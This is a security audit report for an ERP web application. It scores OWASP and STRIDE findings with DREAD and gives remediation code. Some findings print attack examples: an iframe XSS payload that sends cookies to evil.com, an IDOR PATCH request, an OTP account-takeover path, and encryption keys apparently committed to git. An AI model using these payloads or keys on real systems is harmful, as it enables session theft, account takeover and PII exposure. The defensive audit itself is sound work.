# TBS ORDER ERP — Security Audit Report (Final)

> **Date**: 2026-03-17
> **Methodology**: OWASP Top 10 + STRIDE + DREAD Scoring
> **Stack**: NestJS + Next.js 14 + PostgreSQL + Prisma + Redis + JWT
> **Scope**: Full-stack audit — backend, frontend, infrastructure, encryption, auth, RBAC
> **Agents**: 7 parallel security auditors + manual review

---

## Executive Summary

TBS ORDER ERP has **solid security architecture** with defense-in-depth: Helmet.js, CSRF guard, bcrypt (12 rounds), brute-force protection, non-root Docker, TLS 1.2+ Nginx, Sentry PII stripping, ValidationPipe.

However, **8 Critical, 12 High, 15 Medium, and 8 Low** findings were identified. The most severe:

1. **Field-level encryption is a non-functional stub** — PII stored in plaintext
2. **Encryption keys committed to .env in version control**
3. **JWT access token lifetime = 7 days** (should be 15min)
4. **IDOR on CRM customer endpoints** — any SALE reads/modifies any customer
5. **Document endpoints lack @Roles()** — any authenticated user reads all docs
6. **Frontend sanitizeHtml allows iframe** — XSS in blog/wiki/CMS content
7. **File upload accepts any MIME type/size** — malware/DoS vector
8. **Redis password not enforced in production**

---

## DREAD Scoring Legend

| Factor | 1 (Low) | 2 (Medium) | 3 (High) |
|--------|---------|------------|----------|
| **D**amage | Minor data leak | PII exposure | Full system compromise |
| **R**eproducibility | Complex conditions | Moderate | Trivially reproducible |
| **E**xploitability | Requires insider access | Authenticated user | Unauthenticated |
| **A**ffected Users | Single user | Department/role | All users |
| **D**iscoverability | Requires source code | Common scanning | Publicly known |

**Score**: Sum (5-15). **P0**: 12-15 | **P1**: 9-11 | **P2**: 6-8 | **P3**: 5

---

## OWASP Top 10 Risk Matrix

### A01:2021 — Broken Access Control

| ID | Finding | DREAD | Priority |
|----|---------|-------|----------|
| **BAC-01** | **IDOR: CRM customer PATCH** — SALE user can update ANY customer (no DataScopeGuard on CrmController) | D3 R3 E2 A3 D2 = **13** | **P0** |
| **BAC-02** | **Document endpoints missing @Roles()** — any authenticated user reads ALL documents (contracts, customs, financials) | D3 R3 E2 A3 D2 = **13** | **P0** |
| **BAC-03** | **DataScopeService not enforced in Document module** — no row-level access control | D3 R3 E2 A3 D2 = **13** | **P0** |
| **BAC-04** | **WebSocket subscribe allows any channel** — user can join `role:CEO` channel without authorization | D2 R3 E2 A2 D2 = **11** | **P1** |
| **BAC-05** | **Impersonation returns admin's role** instead of target's role — privilege escalation | D3 R2 E2 A1 D1 = **9** | **P1** |
| **BAC-06** | **Missing RBAC cases** for 5 roles (CFO, DIRECTOR_OPERATIONS, HR_MANAGER, LOGISTICS_MANAGER, ACCOUNTANT) — fall to empty default | D2 R3 E1 A2 D1 = **9** | **P1** |
| **BAC-07** | **RolesGuard default = allow** — if @Roles() omitted, ALL authenticated users can access | D2 R3 E1 A2 D2 = **10** | **P1** |
| **BAC-08** | **CRM controller missing DataScopeGuard** entirely (unlike OrderController which has it) | D3 R3 E2 A2 D1 = **11** | **P1** |
| **BAC-09** | **DataScopeService incomplete for warehouse roles** — VN_STAFF from Branch HN can access Branch HCM packages | D2 R2 E2 A2 D1 = **9** | **P1** |

**Details — BAC-01 (IDOR):**
```
File: tbs-erp-backend/src/modules/crm/crm.controller.ts:183-189

@Patch(':id')
@Roles(UserRole.SALE, ...)
async update(@Param('id') id: string, @Body() dto: UpdateCustomerDto) {
  // NO ownership check — SALE_A can modify SALE_B's customer
  return this.crmService.updateCustomer(id, dto);
}

Attack: PATCH /customers/xyz { saleId: "attacker-id" }
→ Customer now belongs to attacker
```

**Details — BAC-02 & BAC-03:**
```
File: tbs-erp-backend/src/modules/document/document.controller.ts:44-89

@Get()           // NO @Roles()
@Get(':id')      // NO @Roles()
@Get(':id/download') // NO @Roles()
@Delete(':id')   // HAS @Roles() ✓ (only delete is protected)
```

---

### A02:2021 — Cryptographic Failures

| ID | Finding | DREAD | Priority |
|----|---------|-------|----------|
| **CF-01** | **PrismaEncryptionProvider is a NON-FUNCTIONAL STUB** — encryption extension never registered with PrismaService. All "encrypted" PII fields (phone, email, bankAccount, taxCode) stored in **PLAINTEXT** | D3 R3 E3 A3 D2 = **14** | **P0** |
| **CF-02** | **Encryption keys committed to .env in git** — FIELD_ENCRYPTION_KEY, TWO_FA_ENCRYPTION_KEY, TWO_FA_ENCRYPTION_SALT all visible to anyone with repo access | D3 R3 E3 A3 D3 = **15** | **P0** |
| **CF-03** | **JWT_EXPIRES_IN=7d** in .env.docker.example — access token lifetime should be <=15min | D3 R3 E3 A3 D3 = **15** | **P0** |
| **CF-04** | **Hardcoded static PBKDF2 salts** — `'tbs-erp-field-encryption-salt'` and `'tbs-erp-hmac-salt'` in source code | D2 R3 E1 A3 D2 = **11** | **P1** |
| **CF-05** | TWO_FA_ENCRYPTION_SALT hardcoded fallback `'tbs-erp-2fa-encryption-salt'` | D2 R2 E1 A2 D1 = **8** | **P2** |
| **CF-06** | Deterministic encryption leaks equality (frequency analysis on emails) | D1 R2 E1 A2 D1 = **7** | **P2** |
| **CF-07** | No automated key rotation — manual re-encryption of entire DB | D2 R1 E1 A3 D1 = **8** | **P2** |
| **CF-08** | Database connection missing SSL/TLS (no sslmode in DATABASE_URL) | D2 R2 E1 A3 D1 = **9** | **P1** |
| **CF-09** | MinIO/S3 storage lacks server-side encryption (SSE) | D2 R2 E1 A2 D1 = **8** | **P2** |

**Details — CF-01 (CRITICAL — Encryption never applied):**
```
File: tbs-erp-backend/src/core/database/prisma-encryption.provider.ts:12-21

// Comment in code:
// "This provider is a non-functional stub...
//  does NOT replace the injected PrismaService singleton,
//  so encryption/decryption configured here has NO effect"

// createPrismaEncryptionExtension() is defined but NEVER called
// Result: Customer.phone, email, bankAccount, taxCode = PLAINTEXT
```

**Details — CF-02 (CRITICAL — Keys in git):**
```
File: tbs-erp-backend/.env (COMMITTED TO REPO)

FIELD_ENCRYPTION_KEY=f9095e9f0c68b97da51360247aca700a2a25faecdd7e24706ef1cc4ddac4461a
TWO_FA_ENCRYPTION_KEY=8080c603c7e73e141ef02238041666a206395cdd35f812b142bf2805e1ca57d8
TWO_FA_ENCRYPTION_SALT=19ec2847fd1d8cbe3337e99bce662dff
```

---

### A03:2021 — Injection

| ID | Finding | DREAD | Priority |
|----|---------|-------|----------|
| **INJ-01** | **Frontend sanitizeHtml() allows iframe** — XSS via `<iframe src="data:text/html,<script>...">` in blog, wiki, CMS pages | D3 R3 E2 A3 D2 = **13** | **P0** |
| **INJ-02** | **Frontend sanitizeHtml() allows `style` attribute** — CSS injection, potential credential stealing via UI overlay | D2 R2 E2 A2 D2 = **10** | **P1** |
| **INJ-03** | **Missing ALLOWED_URI_REGEXP** in frontend sanitizeHtml — `javascript:`, `data:` URIs not blocked | D2 R2 E2 A2 D2 = **10** | **P1** |
| **INJ-04** | **Inconsistent sanitization policy** — backend forbids iframe, frontend allows it | D2 R2 E2 A2 D1 = **9** | **P1** |
| **INJ-05** | Wiki page-view.tsx `injectHeadingIds()` regex preserves onclick attrs before sanitization | D2 R2 E2 A2 D1 = **9** | **P1** |
| **INJ-06** | $queryRawUnsafe in query-analyzer.service.ts with keyword-based blocking (bypassable) | D3 R2 E1 A1 D1 = **8** | **P2** |

**Details — INJ-01:**
```
File: tbs-erp-frontend/src/lib/utils/sanitize-html.ts:31

ALLOWED_TAGS: [..., 'iframe', 'video', ...]
ALLOWED_ATTR: [..., 'src', 'allow', 'allowfullscreen', ...]
// NO ALLOWED_URI_REGEXP defined

Attack: <iframe src="data:text/html,<script>document.location='https://evil.com/?c='+document.cookie</script>">
Used in: Blog posts, FAQ, Wiki pages, Company feed
```

---

### A04:2021 — Insecure Design

| ID | Finding | DREAD | Priority |
|----|---------|-------|----------|
| **ID-01** | **TOCTOU in SMS OTP** — endpoint accepts userId from request body, creating race condition for account takeover | D3 R2 E2 A1 D1 = **9** | **P1** |
| **ID-02** | No concurrent session limit — unlimited simultaneous logins | D1 R3 E2 A1 D2 = **9** | **P1** |
| **ID-03** | Impersonation token uses 1h direct JWT (no session/refresh rotation) | D2 R2 E1 A1 D1 = **7** | **P2** |
| **ID-04** | No refresh token reuse detection — stolen token generates unlimited new tokens | D2 R2 E2 A1 D1 = **8** | **P2** |
| **ID-05** | No audit trail for role/permission changes | D2 R2 E1 A2 D1 = **8** | **P2** |

**Details — ID-01:**
```
File: tbs-erp-backend/src/core/auth/auth.controller.ts:381-428

@Post('2fa/sms/send')
async sendSmsOtp(@Body() body: { userId: string }, ...) {
  // userId comes from REQUEST BODY, not JWT
  // Attacker sends stolen x-2fa-token + victim's userId
  // → SMS OTP sent to victim's phone → account takeover
}
```

---

### A05:2021 — Security Misconfiguration

| ID | Finding | DREAD | Priority |
|----|---------|-------|----------|
| **MC-01** | **Redis password optional in production** — no enforcement of REDIS_PASSWORD | D2 R3 E2 A3 D2 = **12** | **P0** |
| **MC-02** | **GraphQL introspection enabled in staging** — full schema discovery | D2 R3 E3 A2 D2 = **12** | **P0** |
| **MC-03** | MinIO default credentials in .env.docker.example | D2 R3 E2 A2 D2 = **11** | **P1** |
| **MC-04** | Swagger docs exposed in staging (should be dev-only) | D1 R3 E3 A2 D2 = **11** | **P1** |
| **MC-05** | Cookie sameSite='lax' instead of 'strict' for refresh token | D2 R2 E2 A2 D1 = **9** | **P1** |
| **MC-06** | CORS origin hardcoded fallback in ws.gateway.ts | D1 R2 E1 A2 D1 = **7** | **P2** |
| **MC-07** | Encryption v0 key disables all encryption silently (no error in production) | D3 R2 E1 A3 D1 = **10** | **P1** |
| **MC-08** | Vault REJECT_UNAUTHORIZED can be disabled via env var (MITM risk) | D2 R2 E1 A2 D1 = **8** | **P2** |

---

### A06:2021 — Vulnerable and Outdated Components

| ID | Finding | DREAD | Priority |
|----|---------|-------|----------|
| **VOC-01** | No dependency vulnerability scanning in CI/CD | D2 R1 E1 A3 D1 = **8** | **P2** |

---

### A07:2021 — Identification and Authentication Failures

| ID | Finding | DREAD | Priority |
|----|---------|-------|----------|
| **IAF-01** | **SMS OTP: no exponential backoff** — 5 attempts/code, then request new code, repeat | D2 R3 E2 A1 D2 = **10** | **P1** |
| **IAF-02** | **Login brute-force: fixed 15min lockout** — no progressive backoff (5 tries, wait 15min, repeat) | D2 R3 E2 A1 D2 = **10** | **P1** |
| **IAF-03** | **Backup codes not rate-limited** — 10 codes x 8 hex chars, rapid brute-force possible | D2 R2 E2 A1 D1 = **8** | **P2** |
| **IAF-04** | JWT session cache (2min TTL) can bypass session revocation | D2 R2 E1 A1 D1 = **7** | **P2** |
| **IAF-05** | No account-level lockout — only IP-based blocking | D1 R2 E2 A1 D2 = **8** | **P2** |
| **IAF-06** | TOTP window not explicitly configured (relies on otplib default) | D1 R2 E1 A1 D1 = **6** | **P2** |
| **IAF-07** | LoginDto missing @MaxLength on email/password (DoS via bcrypt on huge input) | D1 R3 E3 A1 D2 = **10** | **P1** |

---

### A08:2021 — Software and Data Integrity Failures

| ID | Finding | DREAD | Priority |
|----|---------|-------|----------|
| **SDI-01** | **No MIME type whitelist on document upload** — can upload .exe, .sh, .php | D3 R3 E2 A3 D2 = **13** | **P0** |
| **SDI-02** | **No file size limit** on upload DTO (only @Min(1), no @Max) | D2 R3 E2 A3 D2 = **12** | **P0** |
| **SDI-03** | **No file content verification** — client controls mimeType, fileSize, fileName | D2 R3 E2 A3 D2 = **12** | **P0** |
| **SDI-04** | No malware/virus scanning (ClamAV) | D3 R2 E2 A3 D1 = **11** | **P1** |
| **SDI-05** | CMS media allows SVG upload (can contain embedded JavaScript) | D2 R2 E2 A2 D2 = **10** | **P1** |

---

### A09:2021 — Security Logging and Monitoring

| ID | Finding | DREAD | Priority |
|----|---------|-------|----------|
| **SLM-01** | WebSocket messages not rate-limited | D1 R3 E2 A2 D2 = **10** | **P1** |
| **SLM-02** | Public endpoints (lead capture, tracking, stats) missing rate limiting | D1 R3 E3 A2 D2 = **11** | **P1** |
| **SLM-03** | Logging interceptor logs full URL with query params (may contain PII) | D2 R3 E1 A2 D1 = **9** | **P1** |
| **SLM-04** | Sentry SENSITIVE_FIELDS list incomplete — missing phone, email, bankAccount, taxCode | D2 R2 E1 A2 D1 = **8** | **P2** |
| **SLM-05** | User-Agent stored without truncation in audit logs (log injection/DoS) | D1 R3 E2 A1 D1 = **8** | **P2** |

---

### A10:2021 — SSRF

No SSRF vectors identified. **N/A**.

---

## Consolidated Risk Matrix

| Priority | Count | Key Findings |
|----------|-------|-------------|
| **P0 (Critical)** | **8** | Encryption stub (CF-01), keys in git (CF-02), JWT 7d (CF-03), IDOR CRM (BAC-01), docs no @Roles (BAC-02/03), iframe XSS (INJ-01), file upload (SDI-01/02/03), Redis no password (MC-01), GraphQL introspection (MC-02) |
| **P1 (High)** | **12** | WS auth (BAC-04), impersonation role (BAC-05), missing RBAC cases (BAC-06), RolesGuard default (BAC-07), CRM no DataScope (BAC-08), style XSS (INJ-02/03/04/05), SMS OTP TOCTOU (ID-01), brute-force backoff (IAF-01/02/07), DB no TLS (CF-08), SVG upload (SDI-05), cookie sameSite (MC-05) |
| **P2 (Medium)** | **15** | Salt fallback (CF-05), deterministic encryption (CF-06), no key rotation (CF-07), $queryRawUnsafe (INJ-06), impersonation tokens (ID-03), refresh reuse (ID-04), no audit trail (ID-05), backup codes (IAF-03), session cache (IAF-04), TOTP window (IAF-06), Sentry PII (SLM-04), dependencies (VOC-01), etc. |
| **P3 (Low)** | **8** | CMS sanitization, Helmet config, nonce size, auth cookie validation, health check timeout, Prisma dev query logging, backup encryption |

---

## Remediation Plan

### P0 — Fix within 48 hours

#### 1. Activate field-level encryption (CF-01)
```typescript
// prisma.service.ts — apply the extension in onModuleInit()
async onModuleInit() {
  const extension = createPrismaEncryptionExtension(this.encryptionService);
  this.$extends(extension);
  await this.$connect();
}
```

#### 2. Rotate and remove committed encryption keys (CF-02)
```bash
# 1. Generate new keys
openssl rand -hex 32  # FIELD_ENCRYPTION_KEY
openssl rand -hex 32  # TWO_FA_ENCRYPTION_KEY
openssl rand -hex 16  # TWO_FA_ENCRYPTION_SALT

# 2. Store in Vault/AWS Secrets Manager
# 3. Remove .env from git history
git filter-branch --force --index-filter \
  'git rm --cached --ignore-unmatch tbs-erp-backend/.env' HEAD
# 4. Add to .gitignore
echo 'tbs-erp-backend/.env' >> .gitignore

# 5. Re-encrypt all PII data with new keys
```

#### 3. Fix JWT access token lifetime (CF-03)
```diff
# .env.docker.example
-JWT_EXPIRES_IN=7d
+JWT_EXPIRES_IN=15m
```

#### 4. Fix CRM IDOR — add DataScopeGuard (BAC-01, BAC-08)
```typescript
// crm.controller.ts
@UseGuards(JwtAuthGuard, RolesGuard, DataScopeGuard) // ADD DataScopeGuard
@Controller('customers')
export class CrmController {

  @Patch(':id')
  async update(@Param('id') id: string, @Body() dto, @CurrentUser() user) {
    // Verify ownership
    const existing = await this.crmService.getCustomer(id, user);
    if (existing.saleId !== user.id && !['CEO','COO','SALES_DIRECTOR'].includes(user.role)) {
      throw new ForbiddenException('Cannot modify another sale\'s customer');
    }
    return this.crmService.updateCustomer(id, dto);
  }
}
```

#### 5. Add @Roles() to Document endpoints (BAC-02/03)
```typescript
// document.controller.ts
@Get()
@Roles(UserRole.CEO, UserRole.COO, /* relevant roles */)
async findAll(@Query() query, @CurrentUser() user) {
  const filter = await this.dataScopeService.buildFilter(user);
  return this.documentService.findAll(query, filter);
}
```

#### 6. Fix frontend XSS — remove iframe from sanitizeHtml (INJ-01)
```typescript
// sanitize-html.ts
ALLOWED_TAGS: [
  'h1','h2','h3','h4','h5','h6','p','br','hr','ul','ol','li',
  'blockquote','pre','code','a','strong','em','u','s','sub','sup',
  'table','thead','tbody','tr','th','td','img','figure','figcaption',
  // REMOVED: 'video', 'iframe'
],
ALLOWED_ATTR: [
  'href','target','rel','src','alt','width','height','loading',
  'class','id', // REMOVED: 'style', 'allow', 'allowfullscreen'
],
ALLOWED_URI_REGEXP: /^(https?|mailto|tel|#):/i, // ADD THIS
```

#### 7. Add file upload security (SDI-01/02/03)
```typescript
// upload-document.dto.ts
const ALLOWED_MIMES = [
  'application/pdf','image/jpeg','image/png','image/webp',
  'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
];

@IsIn(ALLOWED_MIMES) mimeType: string;
@Max(52428800) fileSize: number; // 50MB
```

#### 8. Enforce Redis password + disable GraphQL introspection (MC-01/02)
```typescript
// redis.config.ts
if (process.env.NODE_ENV === 'production' && !password) {
  throw new Error('REDIS_PASSWORD required in production');
}

// docker-compose.staging.yml
GRAPHQL_INTROSPECTION: 'false'
GRAPHQL_PLAYGROUND: 'false'
```

---

### P1 — Fix within 1 week

| # | Fix | Files |
|---|-----|-------|
| 9 | Fix WebSocket channel authorization | ws.gateway.ts |
| 10 | Fix impersonation → return target's role, not admin's | jwt.strategy.ts:95 |
| 11 | Add missing RBAC cases for 5 roles | casl-ability.factory.ts |
| 12 | Change RolesGuard default to deny | roles.guard.ts:19 |
| 13 | Fix SMS OTP — remove userId from body, extract from JWT | auth.controller.ts:381 |
| 14 | Add exponential backoff to login + SMS OTP | auth.service.ts |
| 15 | Add @MaxLength(254) on email, @MaxLength(256) on password | login.dto.ts |
| 16 | Remove `style` attr, add ALLOWED_URI_REGEXP | sanitize-html.ts |
| 17 | Fix wiki heading regex XSS | page-view.tsx |
| 18 | Add DB TLS (sslmode=require) | DATABASE_URL |
| 19 | Change cookie sameSite from 'lax' to 'strict' | auth.controller.ts |
| 20 | Disable Swagger in staging | main.ts |
| 21 | Rate-limit public endpoints | public.controller.ts |
| 22 | Add WS message rate limiting | ws.gateway.ts |
| 23 | Strip SVG from media upload whitelist | media.service.ts |
| 24 | Strip PII from URL query params in logs | logging.interceptor.ts |

---

### P2 — Fix within 1 month

| # | Fix |
|---|-----|
| 25 | Remove hardcoded PBKDF2 salt fallbacks — require env vars |
| 26 | Replace $queryRawUnsafe with parameterized queries |
| 27 | Implement refresh token family tracking |
| 28 | Add role change audit trail |
| 29 | Add backup code rate limiting (3 attempts/15min) |
| 30 | Reduce JWT session cache to 30sec |
| 31 | Add account-level brute-force lockout |
| 32 | Add npm audit / Snyk to CI/CD |
| 33 | Automate encryption key rotation |
| 34 | Add concurrent session limit (max 5) |
| 35 | Configure explicit TOTP window |
| 36 | Expand Sentry SENSITIVE_FIELDS |
| 37 | Truncate User-Agent in audit logs |
| 38 | Enable MinIO server-side encryption |
| 39 | Enforce Vault TLS cert validation in production |

---

### P3 — Track and plan

| # | Fix |
|---|-----|
| 40 | Review all CMS dangerouslySetInnerHTML chains |
| 41 | Customize Helmet CSP for backend API |
| 42 | Add Redis TLS + ACL |
| 43 | Increase CSP nonce to 32 bytes |
| 44 | Add backup encryption |
| 45 | Redact Prisma query params in dev logging |
| 46 | Implement @SensitiveField() decorator |
| 47 | Add health check wget timeout |

---

## Security Controls Already Implemented (Positive Findings)

| Control | Status | Notes |
|---------|--------|-------|
| Helmet.js security headers | Implemented | HSTS, X-Content-Type-Options, X-Frame-Options |
| CSRF Guard (Origin/Referer) | Implemented | Correct Bearer token bypass |
| bcrypt password hashing (12 rounds) | Implemented | Good cost factor |
| Brute-force protection (IP-based) | Implemented | 5 attempts / 15min via Redis |
| AES-256-GCM encryption design | Implemented | But not activated (see CF-01) |
| ValidationPipe (whitelist + forbidNonWhitelisted) | Implemented | Transform with no implicit conversion |
| Sentry PII stripping | Implemented | Strips auth headers, passwords, tokens |
| Non-root Docker | Implemented | User nestjs:1001, multi-stage build |
| Nginx TLS 1.2+ only | Implemented | server_tokens off, rate limiting zones |
| CSP via Next.js middleware (nonce) | Implemented | Dynamic per-request policy |
| Refresh token rotation | Implemented | New token per refresh + bcrypt hash storage |
| Prisma parameterized queries ($queryRaw) | Implemented | Safe tagged templates everywhere except query-analyzer |
| Backend HTML sanitization (DOMPurify) | Implemented | @SanitizeHtml decorator, FORBID_TAGS includes iframe |
| API key SHA-256 hashing | Implemented | Never stored/logged in plaintext |
| Path traversal protection (documents) | Implemented | Regex allows only [a-zA-Z0-9\-_.] |
| Soft delete | Implemented | isDeleted flag across entities |
| HTTP exception filter (no stack traces to client) | Implemented | 5xx logged with stack, 4xx as warn |
| Production Swagger disabled | Implemented | Only dev (but staging issue exists) |
| Metrics endpoint restricted | Implemented | Nginx internal-only block |
| Session revocation on logout | Implemented | DB delete + cache invalidate |
| Impersonation admin active check | Implemented | Verified on each request |

---

## STRIDE Threat Model Summary

| Threat | Primary Mitigations | Critical Gaps |
|--------|---------------------|---------------|
| **Spoofing** | JWT + refresh rotation, bcrypt, 2FA TOTP | JWT 7d lifetime, SMS OTP TOCTOU |
| **Tampering** | ValidationPipe, CSRF guard, AES-GCM auth | File upload no content verification |
| **Repudiation** | Audit log interceptor, Sentry, request-id | Role changes not audited, CRM updates unlogged |
| **Information Disclosure** | Field encryption (designed), Sentry PII strip | **Encryption never activated**, keys in git, docs exposed |
| **Denial of Service** | Nginx rate limiting, Throttle, brute-force lock | Public endpoints no rate limit, file size unlimited |
| **Elevation of Privilege** | CASL RBAC, RolesGuard, DataScopeService | **IDOR on CRM**, impersonation bug, WS channel auth, 5 missing roles |

---

*Report generated: 2026-03-17 | 7 parallel security agents + manual review*
*Total files analyzed: ~150+ across backend, frontend, infrastructure*
